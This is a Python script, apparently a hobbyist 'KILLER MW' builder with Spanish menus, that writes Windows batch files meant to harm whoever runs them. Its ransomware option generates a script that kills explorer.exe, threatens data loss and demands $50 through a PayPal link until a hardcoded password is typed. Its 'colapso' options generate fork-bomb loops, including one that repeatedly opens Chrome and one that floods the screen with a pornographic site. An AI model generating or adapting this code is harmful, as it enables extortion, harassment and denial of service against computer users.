import pyfiglet
import os
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'
os.system("clear")
banner=pyfiglet.figlet_format("KILLER MW")
print(RED+banner)
print(YELLOW+"By L.C.A HACK")
def gusano():
	gusano=pyfiglet.figlet_format("WINDOW LOOP")
	print(GREEN+gusano)
def menu():
       print(RESET+"\n\t[1] Ransomware")
       print("\t[2] Virus Colapso")
       print("\t[3] Troyano")
       print("\t[4] Salir")

menu()
def gusa2():
	print(RESET+"\n\t[1] CMD LOOP")
	print("\t[2] Chrome LOOP")
	print("\t[3] XXX infinito")
	print("\t[4] Regresar al Menu Principal")
while True:
        opcion=int(input(RED+"KILLER>> "+RESET))
        if opcion==1:
                file = open("Ransomware.bat" , "w")
                file. write("color 04" + os.linesep)
                file. write("@echo off" + os.linesep)
                file. write("title HACKED" + os.linesep)
                file. write("taskkill /f /im explorer.exe" + os.linesep)
                file. write(":bucle" + os.linesep)
                file. write("cls" + os.linesep)
                file. write("msg * LEE CON ATENCION!." + os.linesep)
                file. write("msg * NO REINICIAR LA COMPUTADORA!." + os.linesep)
                file. write("msg * AL REINICIAR SE ELIMINARA LOS DATOS DEL DISCO DURO!." + os.linesep)
                file. write("msg * TENGA CUIDADO! NO VAYA A CERRAR LA VENTANA DE ARRIBA." + os.linesep)
                file. write("msg * SI USTED CIERRA LA VENTANA! NO PODRA RECUPERAR SU COMPUTADORA!." + os.linesep)
                file. write("msg * ENVIE $50 DOlARES para conseguir la clave." + os.linesep)
                file. write("msg * escribe este link en tu celular para enviar el dinero." + os.linesep)
                file. write("msg * aqui pon tu link de paypal" + os.linesep)

                file. write("echo =============================================" + os.linesep)
                file. write("echo SI CIERRAS ESTA VENTANA NO PODRAS RECUPERAR TUS ARCHIVOS NUNCA" + os.linesep)
                file. write("echo LINK PARA ENVIAR LOS 50 DOLARES: https://www.paypal.me/lcahack666" + os.linesep)
                file. write("echo =============================================" + os.linesep)
                file. write("echo Ingresar la clave." + os.linesep)
                file. write("echo =============================================" + os.linesep)
                file. write("set /p pass=Escriba aqui la clave de recuperacion: " + os.linesep)
                file. write("if %pass%==jakerpro (goto passcorrecto) ELSE (goto bucle)" + os.linesep)
                file. write(":passcorrecto" + os.linesep)
                file. write("echo Felicidades! El password es correcto." + os.linesep)
                file. write("start explorer.exe " + os.linesep)
                file. write("pause" + os.linesep)
                file. write("exit" + os.linesep)
                file.close()
                print(GREEN+"Ransomware Creado con Exito")
        if opcion==2:
            os.system("clear")
            gusano()
            gusa2()
            while True:
                opsion=int(input(RED+"COLAPSE>> "+RESET))
                if opsion==1:
                    filename= open("colapso.bat" ,"w")
                    filename. write("@echo off" + os.linesep)
                    filename. write("taskkill /f /im explorer.exe" + os.linesep)
                    filename. write("start start start" + os.linesep)
                    filename. write("start start start" + os.linesep)
                    filename. write("start start start" + os.linesep)
                    filename. write("start start start" + os.linesep)
                    filename. write("start start start" + os.linesep)
                    filename. write("start start  start start start startstart" + os.linesep)
                    filename. write("start start  start start start start start start start start start start" + os.linesep)
                    filename. write("start start start" + os.linesep)
                    filename. write("start start start" + os.linesep)
                    filename. write("start start  start start start start start start start start start start" + os.linesep)
                    filename. write("start start  start start start start start start start start start start" + os.linesep)
                    filename. write("start start  start start start start start start start start start start" + os.linesep)
                    filename. write("start start  start start start start start start start start start start" + os.linesep)
                    filename. write("start start  start start start start start start start start start start" + os.linesep)
                    filename. write("start start  start start start start start start start start start start" + os.linesep)
                    filename. write("start start  start start start start start start start start start start" + os.linesep)
                    filename. write("start start  start start start start start start start start start start" + os.linesep)
                    filename.close()
                    print(GREEN+" Colapso.bat creado exitosamente")
                if opsion==2:
                    filename= open("Colapso2.bat" ,"w")
                    filename. write("@echo off" + os.linesep)
                    filename. write(":bucle" + os.linesep)
                    filename. write("start chrome.exe start chrome.exe  start chrome.exe" + os.linesep)
                    filename. write("start chrome.exe start chrome.exe start chrome.exe" + os.linesep)
                    filename. write("goto bucle")
                    filename.close()
       	            print(GREEN+"Colapso2.bat Creado con exito")
                if opsion==3:
                    filename = open("Colapso3.bat" , "w")
                    filename. write("@echo off" + os.linesep)
                    filename. write("start www.xnxx.com start www.xnxx.com start www.xnxx.com start www.xnxx.com start www.xnxx.com start www.xnxx.com start www.xnxx.com start www.xnxx.com start www.xnxx.com" + os.linesep)
                    filename.close()
                    print(GREEN+"Colapso3.bat creado con exito")
                if opsion==4:
                    print(RED+banner)
                    print(YELLOW+"\n By L.C.A HACK")
                    menu()
                    break
                    os.system("clear")
        if opcion==3:
                print(YELLOW+"Esta opcion no esta terminada, espere a una nueva actualizacion!!")
        if opcion==4:
                os.system("clear")
                adios = pyfiglet.figlet_format("Adios :)")
                print(MAGENTA+adios)
                break


